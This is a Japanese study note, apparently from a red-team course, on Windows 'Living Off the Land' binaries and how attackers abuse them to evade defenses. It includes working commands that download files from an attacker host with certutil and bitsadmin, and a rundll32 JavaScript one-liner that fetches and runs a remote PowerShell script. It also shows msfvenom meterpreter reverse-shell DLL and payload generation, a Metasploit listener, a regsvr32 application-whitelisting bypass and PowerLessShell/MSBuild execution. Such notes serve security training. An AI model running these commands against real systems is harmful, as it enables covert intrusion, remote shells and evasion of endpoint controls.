## Intro

- Living Off the Landは、レッドチーム・コミュニティのトレンド用語である。この名前は、その土地で手に入る食べ物を食べて生活するという現実の生活から取られている。
- 同様に、敵対者やマルウェア作成者は、ターゲットとなるコンピュータに内蔵されているツールやユーティリティを利用するということ。

- これらの組み込みツールは、ターゲット・システムやネットワーク機能内で様々な通常の活動を行うが、例えば、`CertUtil`ツールを使用してターゲット・マシンに悪意のあるファイルをダウンロードするなど、その使用や悪用が増加している。
- 主な考え方は、マイクロソフトが署名したプログラム、スクリプト、およびライブラリを使用して、防御制御に紛れ込み、回避することである。レッドチーマーは、ターゲットに関与する活動を実行するときに検出されたくないので、ステルス性を維持するためにこれらのツールを利用する方が安全である。

- 以下は、Living Off the Landが包含するいくつかのカテゴリーである：
	- Reconnaissance
	- Files operations
	- Arbitrary code execution
	- Lateral movement
	- Security product bypass

## Windows Sysinternals

### Windows Sysinternalsとは？

- Windows Sysinternalsは、ITプロフェッショナルがWindowsOSを管理、トラブルシューティング、診断するために開発された、様々な高度なトピックを扱うツールと高度なシステム・ユーティリティのセット。  

- Sysinternals Suiteは以下のような様々なカテゴリーに分かれている。
	- Disk management
	- Process management
	- Networking tools
	- System information
	- Security tools
- Windows Sysinternalsツールを使うためには、これらのツールのMicrosoftライセンス契約を受け入れる必要がある。これを行うには、コマンドプロンプトで`-accepteula`(end user licence agreement)引数を渡すか、ツール実行中にGUIを使用する。

### 攻撃者によっての活用とメリット

- ビルトイン・ツールやSysinternalツールは、システム管理者にとって有用であるが、これらのツールは、OS内に内在する信頼性により、ハッカー、マルウェア、ペンテスターにも利用されている。
- この信頼により、ターゲット・システムのセキュリティ・コントロールによって検出されたり、捕捉されたりしにくくなる。
- したがって、これらのツールは、検知や他のブルーチームのコントロールを回避するために使用されている。  
  
- 最近では、これらのツールを使用する敵対者やマルウェア作成者が増加しているため、ブルーチームは悪意のある使用法を認識しており、そのほとんどに対して防御的な制御を実装している

## File操作

- ダウンロード、アップロード、エンコーディングを含むファイル操作で使用されることを目的とした、おもしろいLiving-Off-the-Landテクニックを紹介する

### Certutil

#### 基本

- Certutilは、認証サービスを処理するためのWindows組み込みユーティリティ
- 認証局(CA)構成情報およびその他のCAコンポーネントをダンプして表示するために使用される。
- したがって、このツールの通常の用途は、証明書情報を取得することである。
- しかし、certutil.exeが認証サービスとは無関係のファイルを転送したり、エンコードしたりする可能性があることが判明した。MITRE ATT&CK フレームワークは、この技法を Ingress tool transfer ([T1105](https://attack.mitre.org/techniques/T1105/)) として識別している。
- 主に、==不審なファイル転送やファイルの隠蔽に使用される==

#### 例

- `certutil.exe`を使って攻撃者のWebサーバーからファイルをダウンロードし、Windowsのtmpフォルダーに保存することができる。
- ここでは、`-urlcache` と `-split -f `パラメータを使用して、分割テクニックを使用して提供された URL からダウンロードするようにツールを強制している
```powershell
certutil -URLcache -split -f http://[Attacker_IP]:[PORT]/[File] C:\Windows\Temp\[File]
```
-  `-urlcache` : URL オプションを有効にする
- `-split -f`:  指定されたURLからファイルを分割して強制的に取得する

- また、`certutil.exe`は、ファイルをエンコードしたり、ファイルのコンテンツをデコードするエンコーディングツールとして使用することもできる。ATT&CK [T1027](https://attack.mitre.org/techniques/T1027/)は、ファイルを難読化して発見や分析を困難にするこのテクニックを参照している
```powershell
certutil -encode [エンコードするファイル] [エンコード後のファイル名]
```
- デコードしたいなら`-decode`

- このツールの詳細 [Microsoft Docs: CertUtil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)

### BITSAdmin

#### 基本

- `bitsadmin` ツールは、Background Intelligent Transfer Service (BITS) ジョブの作成、ダウンロード、アップロード、および進行状況の確認に使用できるシステム管理者用ユーティリティ。
- [BITS](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) は、HTTP Webサーバーや SMB サーバーからファイルをダウンロードおよびアップロードするための、低帯域幅で非同期の方法。
- bitsadminツールの詳細については、[Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin)を参照
- 攻撃者は BITS ジョブを悪用し、ハッキングしたマシンに悪意のあるペイロードをダウンロードして実行することができる。この手法の詳細については、ATT&CK [T1197](https://attack.mitre.org/techniques/T1197/) のページを参照
- 主に、==悪意のあるペイロードのダウンロードや実行に使用される==

#### 例

- 指定したURLからファイルをダウンロード
```powershell
bitsadmin.exe /transfer /Download /priority Foreground http://[Attacker_IP]/[File] c:\Users\thm\Desktop\[File]
```
- `/transfer`: 転送オプションを使用する
- `/Download`: ダウンロードタイプというタイプで転送を指定
- `/priority`: フォアグラウンドで実行するジョブの優先順位を設定
- `Foreground`: 最優先

- bitsadminパラメータの詳細について[Microsoft documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer)

### FindStr

#### 基本

- [Findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)は、ファイル内のテキストや文字列パターンを検索するために使用されるMicrosoft組み込みツール。
- findstrツールは、ユーザやシステム管理者がファイルや解析された出力内容を検索するのに役立つ。
- 例えば、8080番ポートが自分のマシンで開いているかどうかを調べたい場合、netstatの結果をパイプにつないで、次のようにそのポートを見つけることができる： `netstat -an| findstr "445".`
- ただ、==SMB共有フォルダからリモート・ファイルをダウンロードできる==ことがわかった

#### 例

- SMB共有フォルダからリモート・ファイルをダウンロード
```powershell
findstr /V [dummystring] \\[MachineName]\[ShareFolder]\[file] > c:\Windows\Temp\[file]
```
- `/V`: 指定された文字列を含まない行を出力する
- `dummystring` : ファイル内で見つかってはならない文字列を指定

- なお、ファイル操作には他のツールも使える。LOLBASをチェック

## File実行

- OS内でバイナリを実行するさまざまな方法を示す。
- バイナリを実行する典型的なケースは、コマンドライン`cmd.exe`やデスクトップからの実行など、既知の様々な方法である。
- しかし、他のシステムバイナリを悪用してペイロードの実行を実現する方法も存在する。
- その理由の 1 つは、ペイロードのプロセスを隠蔽または硬化させることができるから。
- MITRE ATT&CK フレームワークに基づくと、この手法は Signed Binary Proxy Execution または Indirect Command Execution と呼ばれ、攻撃者は他のシステムツールを利用して悪意のあるペイロードを生成する。
- このテクニックは、防御制御を回避するのにも役立つ

### File Explorer

![[Pasted image 20230623152307.png | 100]]

#### 基本

- File Explolerは、Windows用のファイル・マネージャーおよびシステム・コンポーネントである。
- File Explolerのバイナリを使用すると、他の`.exe`ファイルを実行できる。
- この手法は間接コマンド実行と呼ばれ、`explorer.exe `ツールを悪用して、信頼できる親プロセスから悪意のあるスクリプトや実行可能ファイルを起動することができる

- `explorer.exe`のバイナリは次の場所にある
	-  Windows 32 bits version: `C:\Windows\explorer.exe`
	- Windows 64 bits version: `C:\Windows\SysWOW64\explorer.exe`

#### 手順

- 親プロセスの`explorer.exe`の子プロセスを作成するには、以下のコマンドを実行する：
```powershell
explorer.exe /root,"[file to execute]"
```
- `/root "[file to execute]"`: 選択したファイルをルートにしてフォルダツリー付きで開く

### WMIC

#### 基本

- Windows Management Instrumentation (WMIC)は、Windowsコンポーネントを管理するWindowsのコマンドラインユーティリティである。
- WMICは、防御策を回避するためのバイナリの実行にも使用されている
- MITRE ATT&CKフレームワークはこのテクニックをSigned Binary Proxy Execution ([T1218](https://attack.mitre.org/techniques/T1218/))と呼んでいる

#### 例

- 任意のバイナリ（この場合はcalc.exe）の新しいプロセスを作成する。
```powershell
wmic.exe process call create calc
```
- `process`: プロセスに関連する情報を操作するオブジェクト
- `call create` : `process`オブジェクトに対するメソッド呼び出しで、`create`メソッドは新しいプロセスを作成するメソッド

### Rundll32

![[Pasted image 20230623154315.png | 100]]

#### 基本

- Rundll32 は、OS内でDLL ファイルをロードして実行する Microsoft 組み込みのツール
- `rundll32.exe`を悪用して任意のペイロードを実行し、JavaScript や PowerShell スクリプトを実行することができる。
- MITRE ATT&CK フレームワークは、これを Signed Binary Proxy Execution と呼んでいる：[T1218](https://attack.mitre.org/techniques/T1218/011/)

- `rundll32.exe`のバイナリは次の場所にある:
	-  Windows 32 bits version: `C:\Windows\System32\rundll32.exe`
	- Windows 64 bits version: `C:\Windows\SysWOW64\rundll32.exe`

#### 例

- rundll32.exeバイナリを使ってcalc.exeバイナリを実行する
```powershell
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```
- `calc`の部分をファイル名に変える

- 前述したように、rundll32.exeを使ってPowerShellスクリプトを実行することもできる。rundll32.exeを使用し、リモートウェブサイトからファイルをダウンロードするPowerShellスクリプトを実行するJavaScriptを実行する
```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://[Attacker_IP]:[PORT]/[file].ps1');");
```

## Application ホワイトリストのバイパス

### アプリケーション・ホワイトリストのバイパス

- アプリケーション・ホワイトリストは、悪意のある未承認のプログラムがリアルタイムで実行されるのを防ぐ、マイクロソフトのエンドポイントセキュリティ機能。
- アプリケーションホワイトリスティングはルールベースであり、OS上に存在し実行することが許可される、承認されたアプリケーションまたは実行可能ファイルのリストを指定している。
- Windows アプリケーション・ホワイトリストをバイパスするために使用される LOLBAS の例に焦点を当てる。

### Regsvr32

#### 基本

- Regsvr32は、WindowsレジストリにDLLを登録・登録解除するMicrosoftコマンドラインツール。
- regsvr.exeのバイナリは次の場所にある：
	- Windows 32 bits version:  `C:\Windows\System32\regsvr32.exe`
	- Windows 64 bits version: `C:\Windows\SysWOW64\regsvr32.exe`

- `regsvr32.exe`バイナリは、意図した用途以外にも、任意のバイナリを実行したり、Windowsアプリケーションホワイトリスティングを回避したりするために使用できる
- `regsvr32.exe`バイナリは3番目に人気のあるATT&CK手法。
- 攻撃者は`regsvr32.exe`を利用して、ローカルまたはリモートでネイティブコードやスクリプトを実行する。
- `regsvr32.exe`で使用されているテクニックは、信頼されたWindows OSコンポーネントを使用し、メモリ内で実行されるので、これが、このテクニックがアプリケーションのホワイトリストを回避するためにも使用される理由の1つ。

#### 例

- ターゲットシステム上でコマンドを実行するために、`regsvr32.exe` アプリケーションホワイトリストの回避テクニックを使用
- 今回は32ビットOSバージョンで実行したが、64ビットバージョンではregsvr32.exeの場所やmsfvenomのアーキテクチャが変わることに注意

1. まず、msfvenomを使って悪意のあるDLLファイルを作成する。ここでは32ビットOSで動作する悪意のあるファイルを作成する
```zsh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f dll -a x86 > [file name].dll
```
 
2. Metasploitのリスナーがリバースシェルを受け取れるようにセットアップする。
```zsh
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST [IP]; set LPORT [PORT]; run"
```

3. ターゲットマシンにペイロードをdeliveryするためのサーバをセットアップ
```zsh
python -m http.server
```

4. ターゲットマシンに攻撃者マシンから悪意のあるDLLファイルをダウンロードする
```powershell
certutil -URLcache -split -f http://[Attacker_IP]:[PORT]/[File] C:\Windows\Temp\[File]
```

5. regsvr32.exeを使って以下のように実行
- 単純バージョン
```powershell
c:\Windows\System32\regsvr32.exe [path to malicious dll file]
```
- 高度なバージョン
```powershell
c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct [path to malicious dll file]
```
- `/s`: サイレントモード（メッセージを表示しない）  
- `/n`: DLLレジスターサーバーを呼び出さない。  
- `/i:` : `/n`を使用したので、別のサーバーを使用する。  
- `/u`: unregisterメソッドで実行する

### Bash

- MicrosoftはWindows 10,11、Server 2019でLinux環境のサポートを追加した。
- この機能はWindows Subsystem for Linux（[WSL](https://docs.microsoft.com/en-us/windows/wsl/about)）として知られ、[2つの WSL versions](https://docs.microsoft.com/en-us/windows/wsl/compare-versions)が存在する：WSL1とWSL2。
- WSLは、OS上で動作するHyper-V仮想化Linuxディストリビューションで、Linuxカーネルとシステム・コールのサブセットをサポートする。
- この機能は、ユーザーがインストールしてLinuxディストリビューションと対話できるアドオンである。
- WSLの一部として、`bash.exe`はLinux環境と対話するためのMicrosoftツールである。

- ペイロードはMicrosoftの署名付きバイナリなので、人々はペイロードを実行し、Windowsアプリケーションのホワイトリストを回避する方法を見つけた。
- `bash.exe -c [path-to-payload] `を実行することで、署名されていないペイロードを実行することができる。
- ATT&CKはこれを、攻撃者がWindowsツール・ユーティリティを悪用してコマンド実行を取得するIndirect Command execution techniqueと呼んでいる。この手法の詳細については、[T1202](https://attack.mitre.org/techniques/T1202/) 
![[Pasted image 20230623172928.png | 600]]

- `bash.exe`バイナリを使用するには、Windows 10のWindows Subsystem for Linuxを有効にしてインストールする必要があることに注意。

## その他のテクニック

### Shortcuts

[3. Windows Local Persistence](../3.%20Post%20Compromise/3.%20Windows%20Local%20Persistence.md#ショートカットファイル（lnk）のバックドア化)
- ショートカットまたはシンボリックリンクは、OS内で他のファイルやアプリケーションを参照するために使用されるテクニック。
- ユーザーがショートカットファイルをクリックすると、参照先のファイルやアプリケーションが実行される。
- 多くの場合、攻撃者はこのテクニックを利用して、初期アクセス、特権の昇格、または永続性を獲得する。
- MITRE ATT&CK フレームワークでは、このショートカット変更テクニックを[T1547](https://attack.mitre.org/techniques/T1547/009/) と呼んでおり、攻撃者はこのテクニックを利用するためにショートカットを作成または変更する

- ショートカット修正テクニックを使うには、Target:に以下のテクニックを使ってファイルを実行するように設定する：
	- Rundll32
	- Powershell
	- Regsvr32
	- Executable on disk
![[Pasted image 20230623173348.png | 200]]
- 添付の図はショートカットを変更する手口の例で、攻撃者はExcelのTarget: を変更し、`rundll32.exe`を使ってバイナリを実行する。

### No PowerShell!

#### 基本

- [PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell.git)
- 2019年、Red Canaryは、PowerShellが悪意のある活動に最も使用される手法であるとする脅威検出レポートを発表した。
- そのため、組織は`powershell.exe`の実行を監視またはブロックするようになった。その結果、==攻撃者はpowershell.exeを使用せずスクリプトを実行する==他の方法が必要となった

- PowerLessShellはPythonベースのツールで、PowerShellプロセスのインスタンスを表示せずにターゲットマシンで実行する悪意のあるコードを生成する。
- PowerLessShellは、WindowsアプリケーションをビルドするためのプラットフォームであるMicrosoft Build Engine（MSBuild）を悪用してリモートでコードを実行する

#### 実例

1. PowerLessShellをダウンロードする
```zsh
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
```

2. MSBuildで動作するようにPowerShellペイロードを生成する
```zsh
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=[Attacker IP] LPORT=[PORT] -f psh-reflection > [file].ps1
```

3. multi/handlerでリスナーを立てる
```zsh
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST [IP]; set LPORT [PORT]; run" 
```

4. PowerLessShell ディレクトリに移動し、MSBuild ツールと互換性があるようにペイロードを変換
```zsh
python2 PowerLessShell.py -type powershell -source [path to created payload] -output [file].csproj
```

5. 変換したペイロードをターゲットマシンに転送する
```zsh
python -m http.server
```
```powershell
certutil -URLcache -split -f http://[Attacker_IP]:[PORT]/[File] C:\Windows\Temp\[File]
```

6. ターゲットマシンでcsprojファイルをビルドし実行
```powershell
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe [path to csproj file]
```

## 現実のシナリオ

- 2017年、Windows Defender Advanced Threat Protection（[Windows Defender ATP](https://www.microsoft.com/security/blog/2018/11/15/whats-new-in-windows-defender-atp/)）研究チームは、==Astaroth==というファイルレスマルウェアを発見した。
- ファイルレスマルウェアとは、マルウェアがディスクに書き込まれることなくシステム内で実行されることを意味する。
- このマルウェアは、ターゲットデバイスのメモリからすべての機能を実行する
